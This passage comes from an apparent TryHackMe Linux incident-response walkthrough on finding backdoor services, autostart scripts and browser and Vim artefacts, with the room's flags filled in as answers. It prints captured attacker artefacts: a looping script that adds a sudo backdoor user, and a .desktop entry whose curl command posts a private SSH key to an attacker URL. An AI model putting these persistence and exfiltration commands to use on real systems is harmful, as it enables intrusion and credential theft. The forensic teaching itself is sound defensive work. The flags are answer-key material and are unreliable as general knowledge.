 The first process reveals the absolute path of the service executable script (`/usr/local/bin/b4ckd00rftw.sh`), and the second process reveals that it continually runs every 60 seconds (`sleep 60`).

Now that we know the binary that is executed when this service starts, we can perform further investigation on the script's contents:

    Viewing the Executable Associated with the Backdoor Service  
```bash
investigator@tryhackme:~$ cat /usr/local/bin/b4ckd00rftw.sh
#!/bin/bash

while true; do
    sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
    sudo usermod -aG sudo b4ckd00rftw
    sleep 60
done
```

   By dissecting the commands within this script, we can determine that it creates a new user with sudo privileges named **b4ckd00rftw**  and then sleeps for 60 seconds before repeating the process indefinitely.

 Judging by the contents of this script, it is clear that this is another persistence mechanism that the attacker who compromised this system configured to maintain unauthorised access to the system even if initial response actions (like removing the backdoor user) are performed. This type of persistence is why it's important to perform thorough analysis and restore systems from a known-good backup instead of attempting to remediate on a live system, which may not fully address the extent of the compromise.

 Inspecting Service Configuration Files

 Service configuration files, often called unit files in systemd-based Linux distributions, are important for managing and defining services. These files provide systemd with the necessary information to control how a service behaves, including its startup behavior, dependencies, environment variables, and more. In the previous section, we used the `systemctl status` command to list this configuration data for the backdoor service. By querying the status of a service, the system reads from the unit file to collect this information.

 We can read the unit file directly if we know its location, typically in the `/etc/systemd/system/` directory. However, when we queried the status of the service directly, we were given the absolute path of the unit file: `/etc/systemd/system/b4ckd00rftw.service`. We can read the file with the following command:

    Viewing the Backdoor Service Unit File  
```bash
investigator@tryhackme:~$ cat /etc/systemd/system/b4ckd00rftw.service
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/b4ckd00rftw.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

   As seen above, we received similar information to what we received by querying the service's status. Notably, the `ExecStart` value gives us the absolute path of the script or binary executed when the service starts.

 Inspecting Service Logs

 Service log files contain valuable information about the activities, status, and errors generated by services on the system. These logs can be valuable for analysts when investigating services during an incident. The easiest way to query and view service logs from the systemd journal (the systemd logging service) is through the `journalctl` command.

 To view the logs of a specific service (i.e., the backdoor service) in real time, we can run the following command:

    Viewing the Backdoor Service Logs  
```bash
investigator@tryhackme:~$ sudo journalctl -f -u b4ckd00rftw.service
-- Logs begin at Sun 2022-02-27 13:52:14 UTC. --

Mar 13 20:03:33 tryhackme sudo[4177]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -m -p $1$wBUkwyjH$cTZA1K8hQqW6Spxf/en/I/ b4ckd00rftw
Mar 13 20:03:33 tryhackme sudo[4177]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[4178]: useradd: user 'b4ckd00rftw' already exists
Mar 13 20:03:33 tryhackme useradd[4178]: failed adding user 'b4ckd00rftw', data deleted
Mar 13 20:03:33 tryhackme sudo[4177]: pam_unix(sudo:session): session closed for user root
Mar 13 20:03:33 tryhackme sudo[4179]:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo b4ckd00rftw
Mar 13 20:03:33 tryhackme sudo[4179]: pam_unix(sudo:session): session opened for user root by (uid=0)
Mar 13 20:03:33 tryhackme sudo[4179]: pam_unix(sudo:session): session closed for user root
Mar 13 20:03:33 tryhackme b4ckd00rftw.sh[596]: THM{********************************}
```

   To exit from this output, you can press `Ctrl` + `C`.

 In the above output, we continuously monitor and display new log entries related to the **b4ckd00rftw.service**  unit in real time. As seen in the output, we receive some details on the various actions performed by the service, such as the **useradd**  command, which is part of the service binary we investigated earlier, along with correlated timestamps.

 Note that if you do not want to follow the logs in real time, you can omit the `-f` argument.

 Inspecting a service's logs quickly can be useful for troubleshooting. When responding to incidents, service logs can be extremely helpful in identifying unexpected behaviour or malicious executions in real time.

### **Answer the questions below**

**Question:** List all running services on the system. What is the flag you discover in the backdoor service's description?

*Answer:* 

     THM{4922066dc6494e8d4d507eef2205c262}

**Question:** View the journalctl logs associated with the backdoor service. What is the flag you discover?

*Answer:* 

     THM{053c12e620acea8a77b4bdcba578ca19}

---

## Task 6 | Autostart Scripts

Autostart scripts, as the name implies, are scripts or commands executed automatically when a system boots up or a user logs in. These scripts are typically used to launch certain programs or commands automatically without manual intervention on login. User-specific autostart scripts differ from cronjobs and services in that they are tailored to run tasks upon system startup or user login rather than at scheduled intervals like cronjobs or continuously like services. They are crucial in automating the initialisation process of various applications or utilities, ensuring that essential components are up and running without requiring manual intervention.

 There are generally two types of autostart scripts in Linux systems:

 **System-wide autostart scripts**

 These scripts are executed when the operating system boots up before users log in. They are often found in directories like `/etc/init.d/`, `/etc/rc.d/`, or `/etc/systemd/system/`. System-wide autostart scripts are typically used to start system services or daemons, similar to the unit files covered in the previous task.

 **User-specific autostart scripts**

 These scripts are executed when a **user**  logs into their account. They are usually found in directories like `~/.config/autostart/` or `~/.config/` (under various subdirectories). User-specific autostart scripts are commonly used to launch user-specific programs or applications upon login.

 Like with all of the components we've discussed, attackers can target autostart scripts for various reasons. If an attacker can modify or create autostart scripts, they may be able to abuse this to achieve persistence, install backdoors, disguise malware, or execute privileged commands. For example, by injecting malicious commands or binaries to autostart scripts, attackers can execute a reverse shell in the context of a service account or a user, or abuse permissions to escalate privileges. As such, analysts need to be able to review and harden autostart scripts to detect anomalies and prevent abuse.

 Identifying System Autostart Scripts

 **/etc/init.d/**

 This directory typically contains scripts for system service management in traditional SysV init systems and is primarily responsible for starting, stopping, restarting, and managing system services. Each script corresponds to a specific service and follows a standardised naming convention. For example, you might find scripts like `apache2`, `mysql`, or `ssh`, which control the Apache web server, MySQL database server, and OpenSSH server, respectively. These scripts are usually written in Bash or another shell scripting language.

 **/etc/systemd/system/**

 This directory is related to the systemd init system, which has become the default init system in many modern Linux distributions. As discussed in the previous task, services are defined by unit files stored in this directory. They specify various parameters and actions related to a service, such as its dependencies, startup behaviour, environment variables, and more.

 For example, we can identify the `b4ckd00rftw.service` unit file in `/etc/systemd/system/b4ckd00rftw.service`, another way to investigate potentially malicious or altered services.

 Identifying User Autostart Scripts

 Many desktop environments place autostart scripts in the user's home directory. As such, they can be a hiding spot for user-targeted malware. Accessing other users' home directories typically requires elevated privileges, such as using `sudo` or `su` commands. As an investigator, you would need appropriate permissions to access these directories. In this case, the **investigator**  user is in the **sudoers**  group.

 **~/.config/autostart/**

 The autostart scripts' syntax is usually in the form of `.desktop` files, which are plain text files with a specific format. For example, suppose a user wants to automatically launch a custom script that sets up their development environment upon logging into their Linux desktop. They've written a shell script named `setup_dev_env.sh`, located in their home directory, that updates necessary dependencies, sets up environment variables, and launches their IDE and code editor applications. To automate this process, they can create a `.desktop` file inside `~/.config/autostart/` with the following content:

    Example .desktop File  
```bash
[Desktop Entry]
Type=Application
Name=Setup Development Environment
Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"
```

   To break down the important syntax of this file in more detail:

 
- **[Desktop Entry]:**  This is the standard file header indicating a desktop autostart file.
- **Name=Setup Development Environment:**  The name of the autostart entry.
- **Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh":**  The command to execute on startup. Here, `/bin/bash -c` executes the `setup_dev_env.sh` script using **Bash** .

 During an investigation of this nature, we should quickly list the autostart scripts for all users on the system. Once we identify any entries, we should analyse them further to see what scripts or commands they are performing. To do so, we can run a command like:

    Enumerating User Autostart Scripts  
```bash
investigator@tryhackme:~$ ls -a /home/*/.config/autostart
/home/eduardo/.config/autostart:
.  ..  dev.desktop

/home/janice/.config/autostart:
.  ..  keygrabber.desktop
```

   From the above output, we have identified a couple of entries. Specifically, `keygrabber.desktop` under **Janice** 's home directory looks interesting. To view the contents of the autostart entry, we can `cat` the file:

    Viewing Janice's Autostart Script  
```bash
investigator@tryhackme:~$ cat /home/janice/.config/autostart/keygrabber.desktop
[Desktop Entry]
Type=Application
Name=Standard Desktop Configuration (DO NOT MODIFY)
Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://*****.****-**-********.***/**_***"
```

   After analysing the configuration script, it's safe to say we found another persistence method. Specifically, the script uses the `curl` command under the Exec entry to issue a POST request to an external URL. More interestingly, however, the contents of `/home/janice/.ssh/id_rsa` are being sent to the server via the POST request. The `id_rsa` file is Janice's private SSH key and should never be shared, as anyone with the key can connect as Janice to the host.

 This configuration suggests that upon startup, it will execute a curl command to send the contents of Janice's SSH private key (id_rsa file) to an attacker-controlled endpoint.

 Other user-related configuration files that should be investigated include:

 
- **~/.bash_history:**  This file contains a history of commands executed by the user in the Bash shell, providing insights into their activities and commands executed.
- **~/.ssh:**  This directory contains SSH-related files, including a user's SSH keys (**id_rsa** , **id_rsa.pub** ), known_hosts, and authorized_keys.
- **~/.profile:**  This file typically contains user-specific initialisation commands and settings for their shell environment, and similar to autostart scripts, could contain malicious commands.
- **Message of the Day (MOTD)**  While not directly a user-configured file, the Message of the Day is the message that is presented to the user when a user connects to a Linux server via SSH or a serial connection. Linux systems contain several default MOTD files in the `/etc/update-motd.d/` and `/usr/lib/update-notifier/` directories. Like autostart scripts, attackers can create malicious MOTD files that grant them persistence onto the target every time a user connects to the system by executing a backdoor script or command.

 The [Linux File System Analysis](https://tryhackme.com/room/linuxfilesystemanalysis) room investigates some of these locations more thoroughly.

### **Answer the questions below**

**Question:** What is the full URL that receives Janice's private SSH key on system startup?

*Answer:* 

     http://aabab.best-it-services.thm/id_rsa

**Question:** Identify and investigate the remaining .desktop files on the system. What is the command that executes with the Show Network Interfaces autostart script?

*Answer:* 

     ifconfig

---

## Task 7 | Application Artefacts

During live incident investigations, analysing application artefacts can provide valuable insights into user activities, system usage patterns, and potential security concerns. Application artefacts encompass the data generated and stored by applications during their operation, including configuration files, logs, cache files, and other user-specific data.

 Understanding and analysing these artefacts can aid forensic investigators in reconstructing events, identifying anomalies, and determining the impact of the incident. This task will cover some common application artefacts you can expect to encounter; however, the sheer volume of possibilities in the field underscores the importance of building a solid methodology.

 A good first step in application artefact analysis is determining which applications or programs have been installed on the system. This can be achieved by running the `dpkg -l` command. This command will list all installed packages along with their versions:

   Listing All dpkg Installed Packages 
```bash
investigator@tryhackme:~$ sudo dpkg -l
```

   However, it's important to note that this method will only list applications and programs installed through the system's package manager. Unfortunately, there is no surefire way to list manually installed programs and their components generally, which often requires more manual file system analysis.

 Vim

 **Vim**  is a popular text editor that is included with most UNIX systems. It can sometimes leave behind artefacts that can be valuable in forensic investigations. Among these artefacts, the `.viminfo` file stands out as it contains important information about user interactions within Vim sessions. For instance, modifications to scripts or configuration files stored within Vim can be detected, shedding light on potential unauthorised access or tampering by an attacker.

 Additionally, the command history stored in `.viminfo` provides a chronological record of commands executed by users and can be a valuable resource for reconstructing user activities.

 To quickly list out all of the `.viminfo` files stored under the home directory, we can run the following command:

   Finding .viminfo Files 
```bash
investigator@tryhackme:~$ find /home/ -type f -name ".viminfo" 2>/dev/null
/home/janice/.viminfo
/home/ubuntu/.viminfo
```

   Putting it all together, the above command searches for files named `.viminfo` starting from the home directory (`/home`). `2>/dev/null` is a common method to suppress any error messages that might occur during the search and give us a clean output.

 As seen above, we have identified two `.viminfo` files on the system. Since Janice is one of our users of interest, we can analyse the file in more detail by reading its contents:

   Viewing Janice's .viminfo File 
```bash
investigator@tryhackme:~$ sudo cat /home/janice/.viminfo
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

...
# Last Search Pattern:
~MSle0~/

# Command Line History (newest to oldest):
:q
|2,0,1710339077,,"q"
...
```

   As seen in the above output, several artefacts of information are stored in this file by default, including the Vim version, the encoding, the latest search pattern, command-line history, and more.

 Additional text editor artefacts you may come across include `.nano_history` with **Nano**  or `.emacs` or `.emacs.d` with **Emacs** , among others.

 Browser Artefacts

 Web browsers installed on a system, such as Mozilla Firefox and Google Chrome, generate artefacts that can provide insights into user behaviour and activities. These artefacts include browser histories, download logs, and stored cookies. Analysing browser histories and download logs can reveal websites visited, files downloaded, and potentially malicious URLs accessed by the user.

 For example, **Firefox**  organises user data within profile directories, often found in `~/.mozilla/firefox/`. **Google Chrome**  typically stores user profiles (history, web data, login databases, etc.) in `~/.config/google-chrome/`.

 Similar to our method with `.viminfo`, we can quickly list out the browser directories within the workstation's `/home` folder using this command:

   Finding Browser Artefact Directories 
```bash
investigator@tryhackme:~$ sudo find /home -type d \( -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome" \) 2>/dev/null
/home/ubuntu/.mozilla/firefox
/home/eduardo/.mozilla/firefox
```

   As seen in the output above, we have identified two potential locations of browser artefacts. Let's look at **Eduardo** 's Firefox directory at: `/home/eduardo/.mozilla/firefox`

 The next step in our analysis is identifying the profile we need to analyse. We can list out the Firefox directory with the following syntax:

   Listing Firefox Profiles 
```bash
investigator@tryhackme:~$ sudo ls -al /home/eduardo/.mozilla/firefox
total 32
drwx------  6 eduardo eduardo 4096 Mar 13 14:44  .
drwx------  4 eduardo eduardo 4096 Mar 13 14:44  ..
drwx------  3 eduardo eduardo 4096 Mar 13 14:44 'Crash Reports'
drwx------  2 eduardo eduardo 4096 Mar 13 14:44 'Pending Pings'
-rw-r--r--  1 eduardo eduardo   62 Mar 13 14:44  installs.ini
drwx------  2 eduardo eduardo 4096 Mar 13 14:44  lwvdnf29.default
drwx------ 13 eduardo eduardo 4096 Mar 13 15:17  niijyovp.default-release
-rw-r--r--  1 eduardo eduardo  259 Mar 13 14:44  profiles.ini
```

   As noted above, there are two profiles: **lwvdnf29.default**  and **niijyovp.default-release** . The **.default**  file is related to legacy configurations, so we can focus our efforts on the **.default-release**  file.

 In addition to manual inspection of browser artefacts, we can utilise specialised tools for more efficient and comprehensive analysis. Forensic tools like [Dumpzilla](https://www.kali.org/tools/dumpzilla/), for instance, are designed to parse and extract valuable information from browser artefacts, providing investigators with a structured overview of user activity. Dumpzilla can parse data from various web browsers and allow us to analyse browsing histories, bookmarks, download logs, and other relevant artefacts in a streamlined manner.

 We have already retrieved the `dumpzilla.py` script, which can be found in `/home/investigator/dumpzilla.py`.

 Dumpzilla is a very powerful tool. As mentioned, it can extract extensions, bookmarks, cookies, downloads, browsing history, and much more. Since browser profiles can contain potentially sensitive data (like cookies and passwords), we must use sudo to read profiles with elevated privileges. We can run the following syntax to pull down a summary of the data that can be extracted from Eduardo's profile:

   Using Dumpzilla.py 
```bash
investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Summary --Verbosity CRITICAL

==================
Total Information
==================

Total Addons (URLS/PATHS)  : 3
Total Addons               : 0
Total Bookmarks            : 10
Total Cookies              : 34
Total Directories          : 0
Total Downloads history    : 1
Total Search Engines       : 6
Total Forms                : 0
Total History              : 14
Total Public Key Pinning   : 9
Total Permissions          : 4
Total Preferences          : 162
Total Sessions             : 0
```

   In the above output, we can list some interesting metrics. The profile has several bookmarks, cookies, and history that we can extract. By running the `--Help` argument, we can list the available extraction options. Some of the most useful ones include:

   Dumpzilla.py Sample Options 
```bash
--Addons
 --Search
 --Bookmarks
 --Cookies
 --Downloads
 --History
```

   For example, to extract the stored **Cookies** , we can run the following command:

   Extracting Cookies with Dumpzilla.py 
```bash
investigator@tryhackme:~$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Cookies

=======
Cookies              
=======
=> Source file: /home/eduardo/.mozilla/firefox/niijyovp.default-release/cookies.sqlite
=> SHA256 hash: f69caa997d098901992cfdd1c74c1d618d380a47f755b98539e8ec5dbb2efe3b

Host: www.mate-look.org
Name: __ocs_id
Value: ohdsjfhnrb6c8ae8rg02ha0aj5
Path: /
Expiry: 2022-03-29 16:40:22
Last Access: 2022-02-27 16:42:53
Creation Time: 2022-02-27 16:40:22
Secure: No
HttpOnly: Yes
...
```

   As seen in the above output, we can list the cookies stored in Eduardo's Mozilla Firefox profile.

 By analysing browsing history, search history, and cookies, Dumpzilla can help us uncover artefacts such as data that has been exfiltrated, stolen cookies, forms that may have been submitted, or potential contact with C2 servers. In conclusion, leveraging specialised forensic tools like Dumpzilla offers a more efficient and automated approach to analysing browser artefacts.

 Additional Artefacts

 Additional application-related artefacts that may be useful to collect during an investigation depend on the type and purpose of the system. For instance, artefacts related to email clients, word processing software, and terminal multiplexers like Screen or Tmux can provide valuable insights into a workstation. Email client artefacts may include configuration files and message stores, while word processing artefacts may encompass recently accessed documents and temporary files.

 A web server's crucial artefacts may include web server logs, configuration files, and web application logs, which could contain information about accessed URLs, user agents, and server responses. Additionally, CMS artefacts, such as WordPress databases or Joomla configuration files, may offer insights into web application activity.

 Similarly, artefacts such as database logs, configuration files, and SQL query logs on a database server may be useful in detailing database access and executed queries. Overall, understanding and enumerating the specific applications and services running on a system is paramount to identifying relevant artefacts for investigation.

### **Answer the questions below**

**Question:** Analyse Janice's .viminfo log. What flag do you find within the Vim search history?

*Answer:* 

     THM{4a8fd984228d89999342d189e6b916de}

**Question:** Use DumpZilla to investigate Eduardo's Firefox bookmarks. What flag do you find in one of the entries?

*Answer:* 

     THM{5d5cb0ffe8369ab08f1e90aa9e9bc24e}

---

## Task 8 | Conclusion

Congratulations! Throughout our investigation, we forensically examined running processes, audited service configurations, analysed scheduled tasks and autostart scripts, and parsed various application artefacts on the system. Remember, the analysis and identification of compromised system artefacts represent only one phase of the incident response process—the following rooms in the module expand on other equally crucial areas for performing live forensics on Unix-based systems in the field.

 Additionally, if you enjoyed exploring the methodologies of identifying system vulnerabilities and want more insight into hardening these systems, check out the [Bulletproof Penguin](https://tryhackme.com/jr/bppenguin) room! To test your skills in identifying persistence mechanisms on Linux machines, attempt the [Tardigrade](https://tryhackme.com/jr/tardigrade) challenge!

### **Answer the questions below**

**Question:** Click and continue learning!

*Answer:* 

     No answer needed

---

{% endraw %}
